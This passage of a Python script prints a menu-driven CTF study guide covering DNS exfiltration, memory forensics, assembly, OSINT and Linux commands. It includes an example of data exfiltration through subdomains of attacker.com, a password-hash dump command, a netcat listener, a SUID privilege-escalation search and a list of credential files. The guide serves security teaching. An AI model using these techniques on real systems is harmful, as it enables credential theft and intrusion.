│  SSH       │  22    │  Encrypted (but can see connection info)                 │
│  SMB       │  445   │  File transfers, authentication                          │
└────────────┴────────┴──────────────────────────────────────────────────────────┘

DNS EXFILTRATION:
• Data hidden in DNS queries
• Subdomain is encoded data

Example:
  SGVsbG8.attacker.com
  └── Base64 encoded "Hello"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 4.5 MEMORY FORENSICS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Analyzing RAM dumps
• Contains running processes, open files, passwords
• Data that doesn't exist on disk

WHAT YOU CAN FIND:
  • Running processes
  • Open network connections
  • Registry hives
  • Passwords in memory
  • Decrypted data
  • Malware artifacts
  • Command history

COMMON TOOL: Volatility
  • Free and open source
  • Works with Windows, Linux, Mac memory dumps
  
Basic Volatility Commands:
  vol.py -f memory.dmp imageinfo          # Identify OS
  vol.py -f memory.dmp pslist             # List processes
  vol.py -f memory.dmp cmdline            # Command lines
  vol.py -f memory.dmp filescan           # Find files
  vol.py -f memory.dmp dumpfiles          # Extract files
  vol.py -f memory.dmp hashdump           # Extract password hashes
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    SECTION 5: REVERSE ENGINEERING BASICS
# ═══════════════════════════════════════════════════════════════════════════════════

def reverse_engineering_theory():
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SECTION 5: REVERSE ENGINEERING BASICS                               ║
║                    Understanding Compiled Code                                    ║
╚══════════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 5.1 WHAT IS REVERSE ENGINEERING?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DEFINITION:
• Analyzing compiled/binary code to understand its function
• Going backwards: Machine code → Understanding logic
• Finding hidden functionality, vulnerabilities, or secrets

COMPILATION FLOW:
  Source Code (.c, .py, .java)
       ↓
  Compiler/Interpreter
       ↓
  Machine Code (Binary/Executable)
       ↓
  Reverse Engineering
       ↓
  Understanding of Logic

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 5.2 FILE TYPES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EXECUTABLE FORMATS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Format     │  OS           │  Magic Bytes   │  Description                     │
├─────────────┼───────────────┼────────────────┼──────────────────────────────────┤
│  PE/EXE     │  Windows      │  4D 5A (MZ)    │  Portable Executable             │
│  ELF        │  Linux        │  7F 45 4C 46   │  Executable and Linkable Format  │
│  Mach-O     │  macOS        │  CF FA ED FE   │  Mach Object                     │
│  .class     │  Java         │  CA FE BA BE   │  Java bytecode                   │
│  .pyc       │  Python       │  Varies        │  Python compiled                 │
│  APK        │  Android      │  50 4B (ZIP)   │  Android Package (is a ZIP)      │
└─────────────┴───────────────┴────────────────┴──────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 5.3 BASIC ASSEMBLY CONCEPTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHY LEARN ASSEMBLY?
• Lowest level of readable code
• Understanding it helps in reverse engineering
• CTF challenges often require reading assembly

REGISTERS (x86 64-bit):
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Register   │  Purpose                                                          │
├─────────────┼───────────────────────────────────────────────────────────────────┤
│  RAX        │  Accumulator, return values                                       │
│  RBX        │  Base register, general purpose                                   │
│  RCX        │  Counter for loops                                                │
│  RDX        │  Data register                                                    │
│  RSI        │  Source Index (string operations)                                 │
│  RDI        │  Destination Index (first function argument)                      │
│  RSP        │  Stack Pointer                                                    │
│  RBP        │  Base Pointer (stack frame)                                       │
│  RIP        │  Instruction Pointer (next instruction)                           │
└─────────────┴───────────────────────────────────────────────────────────────────┘

COMMON INSTRUCTIONS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Instruction        │  Meaning                                                  │
├─────────────────────┼───────────────────────────────────────────────────────────┤
│  mov rax, rbx       │  Copy value: rax = rbx                                    │
│  add rax, 5         │  Add: rax = rax + 5                                       │
│  sub rax, 5         │  Subtract: rax = rax - 5                                  │
│  xor rax, rbx       │  XOR: rax = rax ^ rbx                                     │
│  cmp rax, rbx       │  Compare rax and rbx (sets flags)                         │
│  jmp label          │  Jump to label (unconditional)                            │
│  je label           │  Jump if equal (ZF=1)                                     │
│  jne label          │  Jump if not equal (ZF=0)                                 │
│  jl / jg            │  Jump if less / greater                                   │
│  call func          │  Call function                                            │
│  ret                │  Return from function                                     │
│  push rax           │  Push rax onto stack                                      │
│  pop rax            │  Pop from stack into rax                                  │
│  lea rax, [rbx+4]   │  Load effective address: rax = rbx + 4                    │
│  nop                │  No operation (do nothing)                                │
└─────────────────────┴───────────────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 5.4 COMMON PATTERNS IN CTF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PASSWORD CHECK:
  ; Compare input with hardcoded password
  mov rsi, user_input
  mov rdi, "secretpass"
  call strcmp
  test eax, eax         ; If equal, eax = 0
  jz success            ; Jump if zero (correct password)

XOR DECRYPTION:
  ; XOR each byte with key
  mov rcx, length
  mov rsi, encrypted
  loop_start:
    xor byte [rsi], KEY
    inc rsi
    dec rcx
    jnz loop_start

ANTI-DEBUGGING:
  ; Check for debugger
  call IsDebuggerPresent
  test eax, eax
  jnz exit_program      ; Exit if debugger detected

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 5.5 QUICK CTF APPROACH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STEP 1: RUN 'strings' FIRST!
  • Often finds hardcoded passwords/flags
  • 80% of easy reverse engineering solved with strings

STEP 2: TRY RUNNING IT
  • See what it does normally
  • Identify what input it expects

STEP 3: USE A DECOMPILER
  • Ghidra (free), IDA Pro
  • Converts assembly back to C-like code

STEP 4: FIND KEY FUNCTIONS
  • main() - entry point
  • check_password, verify, validate
  • strcmp, memcmp - comparisons
  • win, success, print_flag

STEP 5: ANALYZE LOGIC
  • How is input transformed?
  • What is it compared against?
  • Reverse the transformation!
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    SECTION 6: OSINT & RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════════════════════

def osint_theory():
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SECTION 6: OSINT & RECONNAISSANCE                                   ║
║                    Open Source Intelligence Gathering                            ║
╚══════════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 6.1 WHAT IS OSINT?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DEFINITION:
• Open Source Intelligence
• Gathering info from publicly available sources
• No hacking required - just research skills!

COMMON SOURCES:
  • Social media profiles
  • Public databases
  • Website source code
  • Cached/archived pages
  • DNS records
  • WHOIS data
  • Image metadata

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 6.2 WEB RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ROBOTS.TXT:
  • File at /robots.txt
  • Tells search engines what NOT to index
  • Often reveals hidden directories!
  
  Example:
    User-agent: *
    Disallow: /admin/
    Disallow: /backup/
    Disallow: /secret-page/   ← Interesting!

SITEMAP.XML:
  • Lists all pages on site
  • May reveal hidden or forgotten pages

COMMON HIDDEN PATHS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  /admin         /backup        /test          /old                              │
│  /dev           /debug         /api           /staging                          │
│  /.git          /.env          /config        /phpinfo.php                      │
│  /wp-admin      /phpmyadmin    /server-status /console                          │
└─────────────────────────────────────────────────────────────────────────────────┘

SOURCE CODE ANALYSIS:
  • View Page Source (Ctrl+U)
  • Check HTML comments
  • Look for JavaScript files
  • Search for "flag", "secret", "password", "key"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 6.3 IMAGE OSINT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REVERSE IMAGE SEARCH:
  • Google Images
  • TinEye
  • Yandex (best for faces)
  
  Use to find:
    • Original source
    • Higher resolution
    • Related images
    • Location identification

EXIF/GPS DATA:
  • Images may contain GPS coordinates
  • Use exiftool to extract
  • Plot coordinates on Google Maps

GEOLOCATION:
  • Identify location from visual clues
  • Street signs, buildings, landmarks
  • Shadow direction (sun position)
  • Vegetation type, architecture style
  • Tools: GeoGuessr skills, Google Street View

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 6.4 DNS & WHOIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DNS RECORDS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Record Type  │  Contains                                                       │
├───────────────┼─────────────────────────────────────────────────────────────────┤
│  A            │  IPv4 address                                                   │
│  AAAA         │  IPv6 address                                                   │
│  MX           │  Mail servers                                                   │
│  TXT          │  Text records (often contains flags in CTF!)                    │
│  NS           │  Name servers                                                   │
│  CNAME        │  Aliases                                                        │
│  SOA          │  Start of Authority                                             │
└───────────────┴─────────────────────────────────────────────────────────────────┘

Commands:
  nslookup -type=TXT domain.com
  dig TXT domain.com
  dig ANY domain.com

WHOIS:
  • Domain registration info
  • Registrant name, email
  • Registration/expiry dates
  • Name servers

Command: whois domain.com
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    SECTION 7: LINUX ESSENTIALS FOR CTF
# ═══════════════════════════════════════════════════════════════════════════════════

def linux_essentials():
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SECTION 7: LINUX ESSENTIALS FOR CTF                                 ║
║                    Commands Every CTF Player Must Know                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 FILE OPERATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─────────────────────────────────────────────────────────────────────────────────┐
│  Command              │  Purpose                                                │
├───────────────────────┼─────────────────────────────────────────────────────────┤
│  ls -la               │  List all files with details                            │
│  cat file.txt         │  Display file contents                                  │
│  head -n 10 file      │  First 10 lines                                         │
│  tail -n 10 file      │  Last 10 lines                                          │
│  less file            │  Scroll through file                                    │
│  file unknown         │  Identify file type                                     │
│  xxd file             │  Hex dump                                               │
│  hexdump -C file      │  Hex dump with ASCII                                    │
│  strings file         │  Extract readable strings                               │
│  grep "pattern" file  │  Search for pattern                                     │
│  grep -r "flag" .     │  Search recursively                                     │
│  find / -name "*.txt" │  Find files by name                                     │
│  wc -l file           │  Count lines                                            │
│  diff file1 file2     │  Compare files                                          │
└───────────────────────┴─────────────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 TEXT PROCESSING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─────────────────────────────────────────────────────────────────────────────────┐
│  Command                    │  Purpose                                          │
├─────────────────────────────┼───────────────────────────────────────────────────┤
│  sort file                  │  Sort lines                                       │
│  uniq file                  │  Remove duplicates                                │
│  cut -d':' -f1 file         │  Extract field 1, delimiter ':'                   │
│  tr 'a-z' 'A-Z'             │  Translate (lowercase to uppercase)               │
│  tr -d '\\n'                 │  Delete newlines                                  │
│  sed 's/old/new/g' file     │  Replace text                                     │
│  awk '{print $1}' file      │  Print first column                               │
│  rev file                   │  Reverse each line                                │
└─────────────────────────────┴───────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 ENCODING/DECODING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─────────────────────────────────────────────────────────────────────────────────┐
│  Command                          │  Purpose                                    │
├───────────────────────────────────┼─────────────────────────────────────────────┤
│  base64 -d file                   │  Decode Base64                              │
│  echo "text" | base64             │  Encode to Base64                           │
│  echo "hex" | xxd -r -p           │  Hex to binary                              │
│  echo "text" | xxd -p             │  Text to hex                                │
│  echo -n "text" | md5sum          │  MD5 hash                                   │
│  echo -n "text" | sha256sum       │  SHA256 hash                                │
│  openssl enc -d -aes-256-cbc ...  │  AES decryption                             │
└───────────────────────────────────┴─────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 NETWORKING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─────────────────────────────────────────────────────────────────────────────────┐
│  Command                    │  Purpose                                          │
├─────────────────────────────┼───────────────────────────────────────────────────┤
│  curl http://site.com       │  Fetch URL content                                │
│  curl -X POST -d "data"     │  POST request                                     │
│  wget http://site.com/file  │  Download file                                    │
│  nc host port               │  Connect to host:port                             │
│  nc -lvp 4444               │  Listen on port 4444                              │
│  nslookup domain.com        │  DNS lookup                                       │
│  dig TXT domain.com         │  DNS query                                        │
│  ping host                  │  Test connectivity                                │
│  nmap -sV host              │  Port scan with versions                          │
└─────────────────────────────┴───────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 PERMISSIONS & PRIVILEGE ESCALATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PERMISSION STRUCTURE:
  -rwxr-xr-x
   │││ │││ │││
   │││ │││ └─┴─ Others: r-x (read, execute)
   │││ └─┴──── Group: r-x (read, execute)  
   └─┴─────── Owner: rwx (read, write, execute)

IMPORTANT FILES:
  /etc/passwd     - User accounts
  /etc/shadow     - Password hashes (need root)
  /etc/sudoers    - Sudo permissions
  ~/.bash_history - Command history
  ~/.ssh/         - SSH keys

SUID/SGID:
  • SUID: Executes as file owner
  • Find SUID files: find / -perm -4000 2>/dev/null
  • Potential privilege escalation if owned by root!
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                              MAIN MENU
# ═══════════════════════════════════════════════════════════════════════════════════

def main():
    sections = {
        "1": ("Encoding Fundamentals (Base64, Hex, Binary, ASCII)", encoding_theory),
        "2": ("Cryptography (Caesar, XOR, Hashing, RSA)", cryptography_theory),
        "3": ("Web Security (HTTP, SQLi, XSS, LFI)", web_security_theory),
        "4": ("Steganography & Forensics", stego_forensics_theory),
        "5": ("Reverse Engineering Basics", reverse_engineering_theory),
        "6": ("OSINT & Reconnaissance", osint_theory),
        "7": ("Linux Essentials for CTF", linux_essentials),
        "A": ("Show ALL sections", None),
    }
    
    while True:
        print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║             TCS HACKQUEST - COMPLETE THEORY GUIDE                                ║
║                    Understanding CTF Concepts                                    ║
╚══════════════════════════════════════════════════════════════════════════════════╝

  Select a topic to study:

  1.  📦 Encoding Fundamentals (Base64, Hex, Binary, ASCII, URL)
  2.  🔐 Cryptography (Caesar, XOR, Hashing, Symmetric/Asymmetric)
  3.  🌐 Web Security (HTTP, SQL Injection, XSS, LFI, Command Injection)
  4.  🔍 Steganography & Forensics (Hidden Data, PCAP, Memory)
  5.  ⚙️  Reverse Engineering Basics (Assembly, Patterns)
  6.  🕵️  OSINT & Reconnaissance (Information Gathering)
  7.  🐧 Linux Essentials (Commands for CTF)
  
  A.  📚 Show ALL sections
  X.  Exit

""")
        choice = input("Enter your choice: ").strip().upper()
        
        if choice == "X":
            print("\nGood luck with HackQuest! Study hard! 📚\n")
            break
        elif choice == "A":
            for key, (name, func) in sections.items():
                if func:
                    func()
                    print("\n" + "="*80)
                    input("Press Enter to continue to next section...")
        elif choice in sections:
            name, func = sections[choice]
            if func:
                func()
                input("\nPress Enter to return to menu...")
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
